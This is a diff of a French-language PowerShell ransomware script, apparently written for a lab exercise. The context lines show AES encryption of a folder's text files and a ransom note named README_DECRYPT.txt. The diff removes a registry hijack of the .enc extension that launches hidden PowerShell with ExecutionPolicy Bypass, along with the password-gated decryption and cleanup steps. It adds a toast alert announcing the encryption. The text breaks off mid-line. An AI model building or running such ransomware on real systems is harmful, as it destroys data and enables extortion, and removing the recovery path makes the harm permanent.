@@ -4,37 +4,6 @@ $folder = "D:\Desktop\tp-simulation"
 $sha = New-Object System.Security.Cryptography.SHA256Managed
 $key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))
 
-# --- POPUP SCRIPT EN PREMIER ---
-$popupContent = @"
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.MessageBox]::Show(
-    "Ce fichier est chiffre.``n``nVeuillez lire la note de rancon :``nREADME_DECRYPT.txt",
-    "Fichier Chiffre - Acces Refuse",
-    [System.Windows.Forms.MessageBoxButtons]::OK,
-    [System.Windows.Forms.MessageBoxIcon]::Warning
-)
-"@
-$popupContent | Out-File "$folder\open_enc.ps1" -Encoding UTF8
-
-# --- REGISTRE EN PREMIER ---
-New-Item -Path "HKCU:\Software\Classes\.enc" -Force | Out-Null
-Set-ItemProperty -Path "HKCU:\Software\Classes\.enc" -Name "(Default)" -Value "EncryptedFile"
-New-Item -Path "HKCU:\Software\Classes\EncryptedFile\shell\open\command" -Force | Out-Null
-Set-ItemProperty -Path "HKCU:\Software\Classes\EncryptedFile\shell\open\command" `
-    -Name "(Default)" `
-    -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$folder\open_enc.ps1`""
-
-$source = @"
-using System;
-using System.Runtime.InteropServices;
-public class WinAPI {
-    [DllImport("shell32.dll")]
-    public static extern void SHChangeNotify(int wEventId, int uFlags, IntPtr dwItem1, IntPtr dwItem2);
-}
-"@
-Add-Type -TypeDefinition $source
-[WinAPI]::SHChangeNotify(0x08000000, 0, [IntPtr]::Zero, [IntPtr]::Zero)
-
 # --- CHIFFREMENT ---
 $files = Get-ChildItem $folder -File -Filter "*.txt"
 
@@ -80,44 +49,19 @@ Lancez le script de dechiffrement et entrez le mot de passe.
 $utf8Bom = New-Object System.Text.UTF8Encoding $true
 [System.IO.File]::WriteAllText("$folder\README_DECRYPT.txt", $ransom, $utf8Bom)
 Write-Host "Note de rancon creee : README_DECRYPT.txt"
-Write-Host "Association .enc configuree (popup au double-clic)"
-Write-Host ""
-Write-Host "Tous les fichiers sont chiffres."
-Write-Host ""
 
-# --- DEMANDE MOT DE PASSE ---
-$userPassword = Read-Host "Entrer le mot de passe pour dechiffrer"
+# --- NOTIFICATION TOAST ---
+[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
+[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
 
-if ($userPassword -ne $password)
-{
-    Write-Host "Mot de passe incorrect."
-    exit
-}
+$template = [Windows.UI.Notifications.ToastTemplateType]::ToastText02
+$xml = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent($template)
+$xml.GetElementsByTagName("text")[0].AppendChild(
+    $xml.CreateTextNode("FICHIERS CHIFFRES")
+) | Out-Null
+$xml.GetElementsByTagName("text")[1].AppendChild(
+    $xml.CreateTextNode("Vos fichiers ont ete chiffres. Lisez README_DECRYPT.txt")
+) | Out-Null
 
-# --- DECHIFFREMENT ---
-$encryptedFiles = Get-ChildItem $folder -File -Filter "*.enc"
-
-foreach ($encFile in $encryptedFiles)
-{
-    $data = [System.IO.File]::ReadAllBytes($encFile.FullName)
-    $iv = $data[0..15]
-    $encryptedData = $data[16..($data.Length - 1)]
-    $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.Key = $key
-    $aes.IV = $iv
-    $decryptor = $aes.CreateDecryptor()
-    $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
-    $originalName = $encFile.FullName -replace '\.enc$', ''
-    [System.IO.File]::WriteAllBytes($originalName, $decryptedData)
-    Remove-Item $encFile.FullName -Force
-    Write-Host "Dechiffre :" $originalName
-}
-
-# --- NETTOYAGE ---
-Remove-Item "$folder\README_DECRYPT.txt" -Force -ErrorAction SilentlyContinue
-Remove-Item "$folder\open_enc.ps1" -Force -ErrorAction SilentlyContinue
-Remove-Item "HKCU:\Software\Classes\.enc" -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item "HKCU:\Software\Classes\EncryptedFile" -Recurse -Force -ErrorAction SilentlyContinue
-
-Write-Host ""
-Write-Host "Tous les fichiers ont ete dechiffres et restaures."
+$toast = [Windows.UI.Notifications.ToastNotification]::new($xml)
+[Windows.UI.Notifications.Toast
